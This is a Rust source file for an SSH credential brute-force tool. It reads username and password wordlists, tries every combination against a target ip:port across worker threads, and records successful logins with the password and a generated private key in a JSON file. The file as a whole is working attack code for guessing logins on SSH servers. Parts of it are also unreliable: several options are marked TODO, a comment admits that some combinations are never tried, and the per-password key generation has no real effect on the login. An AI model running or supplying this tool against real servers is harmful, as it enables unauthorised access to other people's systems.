use clap::Parser;
use osshkeys::{KeyPair, cipher::Cipher, KeyType};
use ssh_rs::ssh;
use console::style;
use types::*;
use crossbeam::channel::{Sender, Receiver, unbounded};
use chrono::Utc;
use std::{
  thread,
  thread::JoinHandle, time::Duration,
  path::Path,
  io::Write,
  fs::{OpenOptions, File},
  io::ErrorKind,
};

#[derive(Debug, Clone, Parser)]
#[clap(author, version, about)]
pub struct Arguments {
  #[clap(value_parser)]
  /// <ipaddress>:<port>
  pub ip_port: String,
  
  #[clap(value_parser)]
  /// The username list.
  pub usr_wordlist: String,
  
  #[clap(value_parser)]
  /// The password list.
  pub pwr_wordlist: String,

  /// File to write the private keys [TODO]
  #[clap(short, long)]
  pub output: Option<String>,

  #[clap(short, long, value_enum)]
  /// The type of private key o create.
  pub key_type: Option<ArgKeyType>,

  #[clap(long, default_value_if("debug", Some("false"), Some("true")), min_values(0))]
  /// Debug messages [TODO]
  pub debug: bool,

  #[clap(long, default_value_if("error", Some("false"), Some("true")), min_values(0))]
  /// Error messages [TODO]
  pub error: bool,

  #[clap(long, default_value_if("no_plantext_passwords", Some("false"), Some("true")), min_values(0))]
  /// Do not authenticate with plaintext passwords [TODO].
  pub no_plantext_passwords: bool,

  #[clap(short, long)]
  /// The number of threads.
  pub threads: Option<u64>,

  #[clap(short, long, value_enum)]
  /// The cipher to encrypt the private key.
  pub cipher: Option<ArgCipher>,

  #[clap(short, long)]
  /// The number passes to encrypt the private key.
  pub bits: Option<usize>,
}

impl Arguments {

  pub fn dprint(msg: String) -> () {
    println!("{} {}", style("Debug =>").red().bright(), style(msg).cyan());
  }

  // Get the name of the file without the full / relative path.
  #[allow(dead_code)]
  pub fn get_file_name(filename: String) -> String {
    let mut split: Vec<&str> = filename.split("\\").collect();

    if split.len() > 1 {
      return String::from(split[split.len()-1]);
    }

    split = filename.split("/").collect();
    if split.len() > 1 {
      return String::from(split[split.len()-1]);
    }

    return filename;
  }

  #[allow(dead_code)]
  // Works out whether each line uses \r\n or \n.
  pub fn get_line_ending(file_contents: String) -> LineEndings {
    let mut out = LineEndings::CRLF;
    
    let mut content: Vec<&str> = file_contents.split(LF).collect();
    if content.len() > 1 {
      out = LineEndings::LR;
    }

    content = file_contents.split(CRLF).collect();
    if content.len() > 1 {
      out = LineEndings::CRLF;
    }

    out
  }

  #[allow(dead_code)]
  // Reads a file into a string.
  pub fn read_wordlist(filename: &str) -> std::io::Result<String> {
    let file =  std::fs::read_to_string(filename)?;

    if file.len() < 1 {
      println!("{}: failed to read to [{}] or file is empty",
      style("Error").red().bright(), style(filename).cyan());

      std::process::exit(1);
    }

    Ok(file)
  }

  /**Function brute forces ssh users by generating the corresponding private keys via a username and password file
   * Params:
   *  usr_ln:       LineEndings {Determines how to separate each line in the file}
   *  pwr_ln:       LineEndings {Determines how to separate each line in the file}
   *  usr_content:  String      {The username file as a string}
   *  pwr_content:  String      {The password file as a string}
   * Returns KeyOutput
   */
  pub fn populate_output_buffer(&self, usr_ln: LineEndings, pwr_ln: LineEndings, usr_content: String, pwr_content: String) -> KeyOutput {
    let mut bits: usize = 3072;
    let mut threads: u64 = 1;
    let mut cipher = Cipher::Aes256_Ctr;
    let mut algo = KeyType::RSA;
    let ip = self.ip_port.clone();
    let dbg = self.debug.clone();

    let user_filename = Self::get_file_name(self.usr_wordlist.clone());
    let pass_filename = Self::get_file_name(self.pwr_wordlist.clone());
    let mut u_ln = CRLF;
    let mut p_ln = CRLF;
    let mut out = KeyOutput::default();

    match usr_ln {
      LineEndings::LR => { u_ln = LF; }
      _ => {}
    }

    match pwr_ln {
      LineEndings::LR => { p_ln = LF; }
      _ => {}
    }

    if let Some(b) = self.bits {
      bits = b;
    }

    if let Some(t) = self.threads {
      threads = t;
    }

    if let Some(c) = self.cipher.clone() {
      cipher = Self::get_cipher(c);
    }

    if let Some(k) = self.key_type.clone() {
      algo = Self::get_key_type(k);
    }

    if dbg == true {
      Self::dprint(format!("user_filename: {user_filename}, LineEnding: {:#?}", usr_ln)); 
      Self::dprint(format!("pass_filename: {pass_filename}, LineEnding: {:#?}", pwr_ln));
      Self::dprint(format!("bits: {bits} threads: {threads} cipher: {:#?} algorithim: {:#?}, ip:port: {ip}", cipher, algo));
    }

    if threads < 2 {

      // Splits users and passwords into separate lines.
      let users: Vec<&str> = usr_content.split(u_ln).collect();
      let passwords: Vec<&str> = pwr_content.split(p_ln).collect();
  
      for i in users {
        // Enumerate each user.

        for idx in passwords.clone() {
          
          // Generate a private key for the password
          let mut key = String::from("");
          if let Ok(k) = Self::encrypt_pass_to_key(idx, bits, algo) {
            key = k;
          }
          
          // Connect to the server.
          let ckey = key.clone();
          let session = ssh::create_session()
          .username(i)
          .password(idx)
          .private_key(key)
          .connect(ip.clone());

          match session {

            // Populate the output buffer with data.
            Ok(s) => {
              println!(
                "{}: {} with {}@{} with '{}'",
               style("OK").yellow().bright(), style("Successfully connected").green().bright(),
               style(ip.clone()).cyan(), style(i).cyan(), style(idx).cyan()
              );

              s.close();
              out.algorithim = format!("{:#?}", algo);
              out.bits = bits;
              out.cipher = format!("{:#?}", cipher);
              out.time = String::from(Self::get_timedate());
              out.usr_wordlist = user_filename;
              out.pwr_wordlist = pass_filename;
              out.ip = ip.clone();
              out.data.user = String::from(i);
              out.data.password = String::from(idx);
              out.data.private_key = ckey;

              return out;
            },

            // Handle the error.
            Err(e) => {
              println!("{}: usr: {}@{} pwr: '{}' - {}", 
              style("Error").red().bright(), style(ip.clone()).cyan(), style(i).cyan(),
              style(idx).cyan(), e.kind());
            }
          }
        }
      }
    }

    else {
      // Splits each line in the username and password files into separate array/vector chunks.
      let users: Vec<&str> = usr_content.split(u_ln).collect();
      let passwords: Vec<&str> = pwr_content.split(p_ln).collect();
      
      // variables will be passed to thread and username&passwords will be joined to each other.
      let mut userpass: Vec<String> = Default::default();
      let key_info = KeyInfo { bits: bits.clone(), algo: algo.clone(), ip: ip.clone() };

      for i in users {
        for idx in passwords.clone() {
          userpass.push(format!("{i}:{idx}"));
        }
      }

      // Gets the number of lines, items assigned to each thread, and the remainder if the number is odd.
      let items = userpass.len();
      let thread_chunk_sz = items/threads as usize;
      let remainder = items as f64 % threads as f64;
      let mut handles: Vec<JoinHandle<()>> = Default::default();
      
      if dbg.clone() == true {
        println!("items: {}\nthread_chunk_size: {}\nremainder: {}\n {threads}",
        style(items).cyan(), style(thread_chunk_sz).cyan(), style(remainder).cyan());
      }
    
      // Sets up the channel receiver and senders to send and receives message between threads.
      let (tx_msg_in, rx_msg_in) = unbounded::<ThreadMessage>();
      let (tx_msg_out, rx_msg_out) = unbounded::<ThreadMessage>();
      let (tx_out, rx_out) = unbounded::<KeyOutput>();
      
      // Stores the usernames and passwords + the chunk size to be passed to each thread.
      let mut th_data_ch: Vec<String> = Default::default();
      let mut ch_counter: usize = 0;
      
      for i in 0..userpass.len()+1 {
        // Creates clones of each item so the reference is not lost in each iteration of the loop.
        let th_msg_sender_in = tx_msg_in.clone();     // Sends messages to the main thread.
        let th_msg_recv_out = rx_msg_out.clone();   // Sends messages to the worker threads.
        let th_out_sender = tx_out.clone();
        let th_key_info = key_info.clone();

        let cip = self.ip_port.clone();
        let cusr_filename = user_filename.clone();
        let cpwr_filename = pass_filename.clone();

        if ch_counter+1 > thread_chunk_sz {
          let c_data = th_data_ch.clone();
          let cdbg = dbg.clone();

          // Brute force private key login.
          // Call thread function and userpass chunk to thread.
          handles.push(thread::spawn(move || {

            // clone every item and give the worker thread a copy.
            let th_msg_s_i = th_msg_sender_in.clone();
            let th_msg_r_o = th_msg_recv_out.clone();
            let th_out_s = th_out_sender.clone();
            let th_data_chk = c_data.len();
            let th_ip = cip.clone();

            if cdbg == true {
              println!("{} thread_chunk {th_data_chk}\nthread_chk_data: {:?}", style("Debug =>").red().bright(), c_data);
            }

            // Brute force the login and retrive the private key.
            if let Some(buffer) = Self::thread_populate_buffer(th_msg_s_i.clone(), th_msg_r_o.clone(), c_data, &th_key_info) {
              let output = KeyOutput {
                algorithim: format!("{:?}", algo),
                bits: bits.clone(),
                cipher: format!("{:?}", cipher),
                ip: th_ip,
                pwr_wordlist: cpwr_filename,
                usr_wordlist: cusr_filename,
                time: String::from(Self::get_timedate()),
                data: buffer,
              };

              // Message is sent when the thread is ready to send the private key to the main thread.
              match th_msg_s_i.send(ThreadMessage::Data) {
                Ok(_) => {
                  if let Err(e) = th_out_s.send(output) {
                    println!("{}: unable to send keydata to main thread - {}", style("Error").red().bright(), style(e).cyan());
                  }

                  else {
                    println!("{}: Successfully sent keydata to main thread", style("OK").yellow().bright());
                  }
                },

                Err(_) => {}
              }
            }
          }));
          
          ch_counter = 0;
          th_data_ch.clear();
        }

        if let Some(index) = userpass.get(i) {
          th_data_ch.push(index.to_string());
        }

        ch_counter += 1;
      }

      //===================================
      // Code to fix bug for remainder input not submitted to ssh server will go here.
      // TODO
      //===================================

      let mut handle_count: usize = 1;
      std::thread::sleep(Duration::from_millis(500));
      let mut wait_counter: usize = 0;

      loop {
        let crx_msg_in = rx_msg_in.clone();
        let ctx_msg_out = tx_msg_out.clone();
        let crx_out = rx_out.clone();
        let cdbg = dbg.clone();

        if wait_counter >= 10 {
          break;
        }
        
        // Main thread goes through endless loop until the data is ready to be received.
        // Main thread then sends a message to kill all worker threads.
        if let Ok(v) = crx_msg_in.recv() {
          
          match v {
            ThreadMessage::Data => {
              if cdbg == true {
                Self::dprint(format!("Ready to receive key"));
              }

              if let Ok(s) = crx_out.recv() {
                if cdbg == true {
                  Self::dprint(format!("keydata received"));
                }

                out = s;
              }

              if let Ok(_) = ctx_msg_out.send(ThreadMessage::Kill) {
                println!("{}: killing threads", style("OK").yellow().bright());
              }

              break;
            }

            ThreadMessage::Waiting => {}
            ThreadMessage::Kill => {}
          }
        }

        else {
          if cdbg == true {
            Self::dprint(format!("wait_counter: {wait_counter}"));
          }

          wait_counter += 1;
          thread::sleep(Duration::from_millis(500));
        }
      }
      
      for i in handles {
        if let Ok(_) = i.join() {
          if dbg == true {
            Self::dprint(format!("handles joined: {handle_count}"));
          }

          handle_count += 1;
        }
      }
    }

    out
  }

  /**Function is similar to populate_output_buffer in that it also brute forces ssh logins. However this function is designed to send and receiver messages
   * to and from a worker thread to the main thread. The only data that is returns from this function is the usernames, password and private key.
   * Params:
   *  s_msg: Sender<ThreadMessage>    {Sends messages to the main thread}
   *  r_msg: Receiver<ThreadMessage>  {Receives messages from the main thread}
   *  data:  Vec<String>              {Data to be parsed from the username and password files}
   *  info:  &KeyInfo                 {Information about the private key to be created}
   * Returns Option<PrivateKey>
   */
  pub fn thread_populate_buffer(s_msg: Sender<ThreadMessage>, r_msg: Receiver<ThreadMessage>, data: Vec<String>, info: &KeyInfo) -> Option<PrivateKeyData> {
    let c_data = data.clone();
    let key_type = info.algo;
    let bits = info.bits;
    let ip = String::from(info.ip.as_str());

    for i in c_data {
      let cr_msg = r_msg.clone();

      if let Ok(r) = cr_msg.recv_timeout(Duration::from_millis(50)) {
        match r {
          ThreadMessage::Kill => { return None; }
          ThreadMessage::Waiting => {}
          ThreadMessage::Data => {}
        }  
      }

      let pair: Vec<&str> = i.split(":").collect();
      let username = pair[0];
      let password = pair[1];
      let mut key = String::from("");

      if let Ok(k) = Self::encrypt_pass_to_key(password, bits, key_type) {
        key.push_str(k.as_str());
      }

      let session = ssh::create_session()
      .username(username).password(password).private_key(key.clone()).connect(ip.clone());

      match session {
        Ok(s) => {
          s.close();

          println!("{}: {} {}@{} with password '{}'",
          style("OK").yellow().bright(), style("Successfully connected").green().bright(),
          style(username.clone()).cyan(), style(ip.clone()).cyan(), style(password.clone()).cyan());
          
          return Some(PrivateKeyData {
            user: String::from(username),
            password: String::from(password),
            private_key: key,
          });
        },

        Err(e) => {
          // debug messages go here --->

          if let Err(_) = s_msg.send(ThreadMessage::Waiting) {

          }
        }
      }
    }

    None
  }

  // Gets current time and date in UTC.
  pub fn get_timedate() -> String {
    let out = format!("{}", Utc::now())
    .replace("-", "")
    .replace(":", "-")
    .replace(" ", "_")
    .replace(".", "");

    String::from(&out[0..17])
  }

    /**Function returns the full path from the present working directory
   * Params:
   *  nothing
   * Returns Option<String>
   */
  pub fn get_current_directory() -> Option<String> {
    if let Ok(path) = std::env::current_dir() {
      if let Ok(s) = path.into_os_string().into_string() {
        return Some(s)
      }
    }

    None
  }

  // Write the FileInputOutput buffer content to a json file.
  #[allow(dead_code)]
  pub fn write_output(&self, content: KeyOutput) -> () {
    let mut output = String::from("");            // Stores the json output
    let mut filename = String::new();             // Stores the path to writ the file.

    // Fill output string with json.
    match serde_json::to_string_pretty(&content) {
      Ok(s) => {
        output.push_str(s.as_str());
      },
      Err(_) => {}
    }

    // Quits if the json output is empty.
    if output.len() <= 196 {
      println!("{}: No output", style("OK").yellow().bright());
      return;
    }

    // Data will only be written if the output string has a name.
    if let Some(o) = self.output.clone() {
      filename.push_str(o.as_str());
    }

    else {
      return;
    }

    println!("{output}");

    // Format the filename depending on the OS and input.
    match filename.as_str() {
      "." =>  {
        filename.clear();
        filename.push_str(format!("{}_output.json", Self::get_timedate()).as_str());
      }
      
      _ =>    {
        if let Some(s) = Self::get_current_directory() {
          match std::env::consts::OS {
            "windows" =>  { filename = format!("{s}\\{filename}.json"); }
            "linux" =>    { filename = format!("{s}/{filename}.json"); }
            _ =>          { filename = format!("{s}/{filename}.json"); }
          }
        }
      }
    }

    // Create the file if it does not exist.
    let test_path = Path::new(&filename);
    if test_path.exists() == false {
      match File::create(&filename) {
        Ok(_) => {
          println!("{}: {} {}", style("OK").yellow().bright(), style("Successfully created").green().bright(), style(filename.clone()).cyan());
        },

        Err(e) => {
          println!("{}: {}", style("Error").red().bright(), e.kind());
        }
      }
    }

    // Write the output to the file.
    match OpenOptions::new().read(true).write(true).open(&filename) {
      Ok(mut f) => {
        if let Ok(file) = f.write(&output.as_bytes()) {
          println!(
            "{}: {} {} bytes to {}",
            style("OK").yellow().bright(), style("Successfully wrote").green().bright(), style(filename.clone()).cyan(),
            style(file).cyan()
          );
        }
      },
      Err(e) => {
        println!("{}: unable to write output to file - {}", style("Error").red().bright(), style(e.kind()).cyan());
      }
    }
  }

  /**Function creates a d private key in the openssh format
   * Params:
   *  text: &str        {Passphrase to encrypt}
   *  bits: u32         {The bits / passes to encrypt the key}
   *  key:  KeyType     {The type of algorithim to use}
   * Returns String
   */
  #[allow(dead_code)]
  pub fn encrypt_pass_to_key(text: &str, bits: usize, key: osshkeys::KeyType) -> std::result::Result<String, osshkeys::error::Error> {
    let pair = KeyPair::generate(key, bits)?;
    let key = pair.serialize_openssh(Some(text), Cipher::Aes256_Ctr)?.replace("\n", "");

    Ok(key)
  }

  /**function parses the input specified by the user and assigns it to the corresponding key algorithim type
   * Params:
   *  key_type: ArgKeyType {The key algorithim}
   * Returns KeyType
   */
  #[allow(dead_code)]
  pub fn get_key_type(key_type: ArgKeyType) -> osshkeys::KeyType {
    let mut out = osshkeys::KeyType::RSA;

    match key_type {
      ArgKeyType::Dsa =>     { out = KeyType::DSA }
      ArgKeyType::Ecdsa =>   { out = KeyType::ECDSA }
      ArgKeyType::Ed25519 => { out = KeyType::ED25519 }
      ArgKeyType::Rsa =>     { out = KeyType::RSA }
    }

    out
  }

  /**Function parses the users input and assigns it to the corresponding cipher.
   * Params:
   *  cipher: ArgCipher {The cipher to use}
   * Returns Cipher
   */
  #[allow(dead_code)]
  pub fn get_cipher(cipher: ArgCipher) -> Cipher {
    let mut out = Cipher::Aes128_Cbc;

    match cipher {
      ArgCipher::Aes128Cbc => { out = Cipher::Aes128_Cbc }
      ArgCipher::Aes128Ctr => { out = Cipher::Aes128_Ctr }
      ArgCipher::Aes192Cbc => { out = Cipher::Aes192_Cbc }
      ArgCipher::Aes192Ctr => { out = Cipher::Aes192_Ctr }
      ArgCipher::Aes256Cbc => { out = Cipher::Aes256_Cbc }
      ArgCipher::Aes256Ctr => { out = Cipher::Aes256_Ctr }
    }

    out
  }

}

pub mod types {
  use osshkeys::KeyType;
  use serde::Serialize;
  use clap;

  pub const LF: &str = "\n";
  pub const CRLF: &str = "\r\n";  

  #[derive(Debug, Clone)]
  pub struct KeyInfo {
    pub ip: String,
    pub bits: usize,
    pub algo: KeyType
  }
  
  #[derive(Debug, Clone)]
  pub enum LineEndings {
    LR,
    CRLF,
  }

  #[derive(Debug, Clone, clap::ValueEnum)]
  pub enum ArgKeyType {
    Rsa,
    Dsa,
    Ecdsa,
    Ed25519,
  }
  
  #[derive(Debug, Clone)]
  pub enum ThreadMessage {
    Data,
    Waiting,
    Kill,
  }
  
  #[derive(Debug, Clone, clap::ValueEnum)]
  pub enum ArgCipher {
    Aes128Cbc,
    Aes128Ctr,
    Aes192Cbc,
    Aes192Ctr,
    Aes256Cbc,
    Aes256Ctr,
  }
  
  #[derive(Debug, Clone, Serialize, Default)]
  pub struct KeyOutput {
    pub ip: String,
    pub data: PrivateKeyData,
    pub bits: usize,
    pub cipher: String,
    pub algorithim: String,
    pub usr_wordlist: String,
    pub pwr_wordlist: String,
    pub time: String,
  }
  
  #[derive(Debug, Clone, Default, Serialize)]
  pub struct PrivateKeyData {
    pub user: String,
    pub password: String,
    pub private_key: String,
  }
}



// pub fn parse_response(response: String) -> FileJsonOutput {
//   // Deserialize the json object in another thread.
//   let (tx, rx) = std::sync::mpsc::channel::<FileJsonOutput>();
//   std::thread::spawn(Box::new(move || {
//     match serde_json::from_str::<FileJsonOutput>(&response) {
//       Ok(s) => {

//         // Send the results back to the main thread.
//         match tx.send(s) {
//           Ok(_) => {},
//           Err(e) => {
//             println!("{e}");
//           }
//         }
//       },
//       Err(e) => {
//         println!("{e}");
//       }
//     }
//   }));

//   // Receives the data.
//   let mut output_data = FileJsonOutput::default();
//   match rx.recv() {
//     Ok(s) => {
//       output_data = s;
//     },
//     Err(_) => {}
//   }

//   output_data
// }